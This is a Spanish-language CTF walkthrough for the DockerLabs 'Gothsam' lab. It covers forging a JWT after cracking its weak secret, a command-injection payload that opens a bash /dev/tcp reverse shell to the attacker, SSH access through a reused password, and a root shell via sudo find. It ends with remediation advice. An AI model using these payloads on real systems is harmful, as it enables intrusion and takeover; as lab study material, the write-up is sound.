---
title: "DockerLabs - Gothsam"
difficulty: "Fácil"
source: "DockerLabs"
---

**Target:** 172.17.0.3
**Plataforma:** DockerLabs
**Dificultad:** Fácil
**Categoría:** JWT (HS256 weak secret) · Command Injection · Password Reuse · Sudo misconfig

**Descripción:** Laboratorio temático de Gotham que encadena cuatro vectores clásicos: bypass de autenticación forjando un JWT con secreto débil, ejecución remota de comandos vía command injection (con reverse shell), movimiento lateral por reutilización de credenciales y escalada a root por un binario mal configurado en `sudo`.

## Despliegue

```bash
unzip gotham.zip
bash auto_deploy.sh gotham.tar
```

---

## Reconocimiento

### Nmap

```bash
nmap -sCV -p- 172.17.0.3
```

Puertos abiertos:
- **22/tcp** — OpenSSH 8.9p1 (Ubuntu)
- **80/tcp** — Apache httpd 2.4.52 (Ubuntu) — *"Gotham City Network"*

### Gobuster

```bash
gobuster dir -u http://172.17.0.3 \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -x php,txt,sql,zip,bak -t 50
```

Rutas relevantes:
- `index.php` (200) — login
- `admin.php` (302 → index.php) — protegido
- `dashboard.php` (302 → index.php) — protegido
- `config.php` (200, size 0 vía HTTP)
- `robots.txt` (60 bytes) — desautoriza `/admin.php` y `/dashboard.php`
- `server-status` (403)

Inspeccionando el HTML de `/` aparece un comentario delator:

```html
<!-- TODO: remove the temporary guest:guest account before go-live -- W.E. -->
```

Credenciales: **`guest:guest`**.

---

## 1. Bypass de autenticación — JWT HS256 con secreto débil

Login con `guest:guest` → acceso a `dashboard.php`, pero con **nivel `user`**. El panel `admin.php` exige nivel `admin`.

La sesión se guarda en una cookie que resulta ser un **JWT**:

```json
{"typ":"JWT","alg":"HS256"}
{"user":"guest","role":"user","iat":1784238486}
```

Al ser **HS256** (clave simétrica), si el secreto es débil se puede crackear y firmar tokens propios. Se vuelca el token a fichero y se crackea con **john**:

```bash
echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9....' > jwt.txt
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
```

Secreto encontrado: **`batman`**.

> Nota: `hashcat -m 16500` requiere backend OpenCL/GPU; en esta caja no estaba instalado, así que `john` (o un bucle HMAC en Python) es la vía fiable.

Se forja un token con `role:admin` firmando con `batman`:

```python
python3 -c "
import hmac, hashlib, base64, json

def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({'typ':'JWT','alg':'HS256'}, separators=(',',':')))
payload = b64url(json.dumps({'user':'admin','role':'admin','iat':1784238486}, separators=(',',':')))

msg = f'{header}.{payload}'.encode()
sig = hmac.new(b'batman', msg, hashlib.sha256).digest()

print(f'{header}.{payload}.{b64url(sig)}')
"
```

Se sustituye la cookie `session` por el token forjado y se accede al **NOC** (`admin.php`).

---

## 2. Command Injection → Reverse Shell (www-data)

El NOC expone una utilidad *"connectivity check"* que hace `ping` sobre el host que introduzcas (param `host`). La entrada se concatena al comando de shell sin sanitizar, así que se puede encadenar con `&&` / `;`.

**Listener** en la máquina atacante:

```bash
nc -lvnp 4444
```

**Payload** en el campo `host` (la IP del atacante es la gateway `docker0`, `172.17.0.1`, tal como la ve el contenedor):

```bash
172.17.0.3 && bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'
```

Conexión recibida como **www-data**. Estabilización de la TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
stty rows 38 columns 116
```

---

## 3. Enumeración local

Vías revisadas (incluye descartes, para no perder tiempo replicando):

- **`/start.sh`** — entrypoint del contenedor. Corre como root pero solo al arrancar el contenedor (lo lanza Docker), no es re-disparable por www-data. **Descartado.**
- **`/etc/cron.d`** — entradas que ejecutan `sessionclean`:
  ```bash
  ls -l /usr/lib/php/sessionclean
  # -rwxr-xr-x 1 root root 2976 Jan 28 2022
  ```
  Es el `sessionclean` legítimo de Ubuntu, `root:root` y **no escribible** por www-data. **Rabbit hole, descartado.**
- **`config.php`** — el premio:

```php
$DB_USER = 'gothamdb';
$DB_PASS = 'Arkh4m_Kn1ght!'; // NOTE(W.E.): misma clave usada en la cuenta de mantenimiento
$JWT_SECRET = 'batman';
```

Además, en `/etc/passwd` hay un usuario con shell: **`bruce`**.

---

## 4. Password Reuse — movimiento lateral a bruce

El comentario de `config.php` indica que `Arkh4m_Kn1ght!` es la clave de la "cuenta de mantenimiento" → **bruce**. Reutilización de credenciales vía SSH:

```bash
ssh bruce@172.17.0.3      # password: Arkh4m_Kn1ght!
cat ~/user.txt
```

🚩 **user.txt:** `d1f4a9c0b7e35628af1029384756bcde`

---

## 5. Escalada a root — sudo find (GTFOBins)

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/find
```

[`find` en GTFOBins](https://gtfobins.github.io/gtfobins/find/#sudo) permite ejecución arbitraria vía `-exec`. Al correr con `sudo` sin contraseña:

```bash
sudo find . -exec /bin/sh \; -quit
# whoami
root
cat /root/root.txt
```

🚩 **root.txt:** `a7e2c9f81b6d40539e8170264fbac3d5`

---

## Resumen de la cadena

| Fase | Vector | Resultado |
|------|--------|-----------|
| 1 | JWT HS256 con secreto débil (`batman`) → forja `role:admin` | Acceso al NOC |
| 2 | Command injection en param `host` → reverse shell | www-data |
| 3 | Password reuse (`Arkh4m_Kn1ght!` en `config.php`) | SSH como bruce (user) |
| 4 | `sudo NOPASSWD /usr/bin/find` (GTFOBins) | root |

**Rabbit holes:** `/start.sh` (entrypoint, no re-disparable) y cron `sessionclean` (binario de sistema, no escribible).

---

## Remediación

- **JWT:** secreto largo y aleatorio (>32 bytes) o firma asimétrica (RS256). Nunca palabras de diccionario. Validar `alg` en servidor y rechazar `none`.
- **Command injection:** no concatenar entrada de usuario a shell. Validar/whitelist del host y usar `escapeshellarg()` o `ping` vía `exec` con argumentos separados.
- **Password reuse:** credenciales únicas por servicio, gestor de secretos (vault), no hardcodear en `config.php` dentro del web root.
- **Sudo:** no otorgar `NOPASSWD` a binarios con capacidad de ejecución arbitraria (`find`, `vim`, `awk`, etc.). Mínimo privilegio.
- Eliminar la cuenta temporal `guest:guest` y el comentario del HTML.
